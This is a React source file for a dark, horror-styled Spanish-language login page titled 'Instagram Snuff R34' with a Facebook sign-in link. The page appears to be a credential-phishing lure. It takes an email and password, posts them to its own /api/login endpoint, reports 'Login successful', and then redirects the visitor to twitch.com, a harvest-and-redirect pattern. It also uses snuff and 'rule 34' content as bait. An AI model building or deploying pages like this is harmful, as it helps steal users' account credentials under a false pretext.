import { useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { Card } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { EyeIcon, EyeOffIcon, Mail as EnvelopeIcon, Lock as LockIcon } from "lucide-react";
import { FaGoogle, FaFacebookF, FaApple } from "react-icons/fa";
import { Separator } from "@/components/ui/separator";

// Define validation schema extending the insert schema
const loginSchema = z.object({
  email: z.string().email("Please enter a valid email address"),
  password: z.string().min(6, "Password must be at least 6 characters"),
  rememberMe: z.boolean().default(false),
});

type LoginFormValues = z.infer<typeof loginSchema>;

export default function Login() {
  const { toast } = useToast();
  const [showPassword, setShowPassword] = useState(false);
  
  // Initialize the form with react-hook-form
  const form = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
      rememberMe: false,
    },
  });

  // Setup mutation for login
  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormValues) => {
      const response = await apiRequest("POST", "/api/login", data);
      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Success",
        description: "Login successful! Redirecting...",
        variant: "default",
      });
      
      // Redirect to Twitch after a short delay
      setTimeout(() => {
        window.location.href = 'https://www.twitch.com';
      }, 1500);
    },
    onError: (error) => {
      toast({
        title: "Error",
        description: error.message || "Login failed. Please try again.",
        variant: "destructive",
      });
    },
  });

  // Handle form submission
  const onSubmit = (data: LoginFormValues) => {
    loginMutation.mutate(data);
  };

  // Toggle password visibility
  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 relative retro-container vhs-effect"
         style={{
           background: "#000",
           backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='100%25' height='100%25' xmlns='http://www.w3.org/2000/svg'%3E%3Cdefs%3E%3Cpattern id='pattern' width='8' height='8' patternUnits='userSpaceOnUse' patternTransform='rotate(45)'%3E%3Crect width='2' height='2' fill='%23300' x='0' y='0'/%3E%3C/pattern%3E%3C/defs%3E%3Crect width='100%25' height='100%25' fill='%23000'/%3E%3Crect width='100%25' height='100%25' fill='url(%23pattern)'/%3E%3C/svg%3E\")"
         }}>
      {/* Blood drip effects */}
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      <div className="blood-drip"></div>
      
      {/* Old TV noise effect */}
      <div style={{
        position: "absolute",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        background: "url('data:image/png;base64,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')",
        backgroundSize: "100% 100%",
        opacity: 0.06,
        pointerEvents: "none",
        zIndex: 1000
      }}></div>
      
      <Card className="max-w-md w-full overflow-hidden shadow-xl border-2 border-red-900" 
            style={{ 
              background: "#0a0a0a", 
              boxShadow: "0 0 20px rgba(255, 0, 0, 0.5), 0 0 30px rgba(255, 0, 0, 0.3)",
              borderRadius: "4px"
            }}>
        {/* Terminal-like top bar */}
        <div className="p-1 bg-red-900 flex items-center">
          <div className="w-3 h-3 mx-1 bg-red-300 rounded-full"></div>
          <div className="w-3 h-3 mx-1 bg-yellow-300 rounded-full"></div>
          <div className="w-3 h-3 mx-1 bg-green-300 rounded-full"></div>
          <div className="flex-1 text-center">
            <span className="text-xs text-gray-200 retro-font">restricted_access.exe</span>
          </div>
        </div>
        
        {/* Header Section */}
        <div className="p-6 bg-gradient-to-r from-black via-red-900 to-black text-white text-center">
          <h1 className="text-2xl font-bold horror-text tracking-wider glitch">
            <span className="block mb-2" style={{ fontSize: "13px", opacity: 0.8, letterSpacing: "2px" }}>TERMINAL C:\\</span>
            Instagram Snuff R34
          </h1>
          <div className="mt-2 retro-font text-red-500" style={{ fontSize: "14px", letterSpacing: "1px" }}>
            <span className="inline-block">SYSTEM</span> 
            <span className="inline-block mx-1 animate-pulse">:</span>
            <span>Inicia sesión para continuar...</span>
          </div>
        </div>

        {/* Form Section */}
        <div className="p-6">
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            {/* Email/Username Field */}
            <div className="space-y-1">
              <Label htmlFor="email" className="text-sm font-medium text-red-300">
                Correo electrónico / Usuario
              </Label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <EnvelopeIcon className="h-4 w-4 text-red-500" />
                </div>
                <Input
                  id="email"
                  type="text"
                  placeholder="Correo electrónico o usuario"
                  className="pl-10 pr-3 bg-black/80 border-red-900 text-white placeholder:text-gray-500 focus:ring-red-700 focus:border-red-700"
                  style={{ boxShadow: "inset 0 1px 3px rgba(255, 0, 0, 0.3)" }}
                  {...form.register("email")}
                />
              </div>
              {form.formState.errors.email && (
                <p className="text-red-500 text-xs">{form.formState.errors.email.message}</p>
              )}
            </div>

            {/* Password Field */}
            <div className="space-y-1">
              <Label htmlFor="password" className="text-sm font-medium text-red-300">
                Contraseña
              </Label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <LockIcon className="h-4 w-4 text-red-500" />
                </div>
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  placeholder="Contraseña"
                  className="pl-10 pr-10 bg-black/80 border-red-900 text-white placeholder:text-gray-500 focus:ring-red-700 focus:border-red-700"
                  style={{ boxShadow: "inset 0 1px 3px rgba(255, 0, 0, 0.3)" }}
                  {...form.register("password")}
                />
                <button
                  type="button"
                  onClick={togglePasswordVisibility}
                  className="absolute inset-y-0 right-0 pr-3 flex items-center"
                >
                  {showPassword ? (
                    <EyeOffIcon className="h-4 w-4 text-red-500" />
                  ) : (
                    <EyeIcon className="h-4 w-4 text-red-500" />
                  )}
                </button>
              </div>
              {form.formState.errors.password && (
                <p className="text-red-500 text-xs">{form.formState.errors.password.message}</p>
              )}
            </div>

            {/* Remember Me & Forgot Password */}
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-2">
                <Checkbox
                  id="remember"
                  className="border-red-700 bg-black text-red-600 focus:ring-red-700"
                  {...form.register("rememberMe")}
                />
                <Label htmlFor="remember" className="text-sm text-red-300 hover:text-red-200">
                  Recordar datos
                </Label>
              </div>
              <div className="text-sm">
                <a href="#" className="font-medium text-red-500 hover:text-red-400 hover:underline">
                  ¿Has olvidado la contraseña?
                </a>
              </div>
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              className="w-full pulse-button bg-gradient-to-r from-black via-red-900 to-black hover:via-red-800 text-white border border-red-900"
              style={{ textShadow: "0 0 5px rgba(255,0,0,0.7)" }}
              disabled={loginMutation.isPending}
            >
              {loginMutation.isPending ? (
                <span className="flex items-center">
                  <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Procesando...
                </span>
              ) : (
                "Iniciar sesión"
              )}
            </Button>
          </form>

          {/* Separator */}
          <div className="mt-6">
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <Separator className="w-full bg-red-900/50" />
              </div>
              <div className="relative flex justify-center text-sm">
                <span className="px-2 bg-black text-red-500">
                  O
                </span>
              </div>
            </div>
          </div>

          {/* Facebook login */}
          <div className="mt-6 text-center">
            <a href="#" className="flex items-center justify-center text-sm text-red-400 font-medium hover:text-red-300 transition-colors">
              <FaFacebookF className="h-4 w-4 mr-2" />
              Iniciar sesión con Facebook
            </a>
          </div>

          {/* Create Account Link */}
          <div className="mt-6 text-center">
            <p className="text-sm text-red-300">
              ¿No tienes una cuenta?{" "}
              <a href="#" className="font-medium text-red-500 hover:text-red-400 hover:underline">
                Regístrate
              </a>
            </p>
          </div>
          
          {/* Warning text */}
          <div className="mt-6 text-center">
            <p className="text-xs text-red-700 italic" style={{ animation: "flicker 8s infinite alternate", opacity: 0.8 }}>
              * Al iniciar sesión aceptas los términos de uso y tu alma queda vinculada a nuestro servicio...
            </p>
          </div>
        </div>
      </Card>
    </div>
  );
}
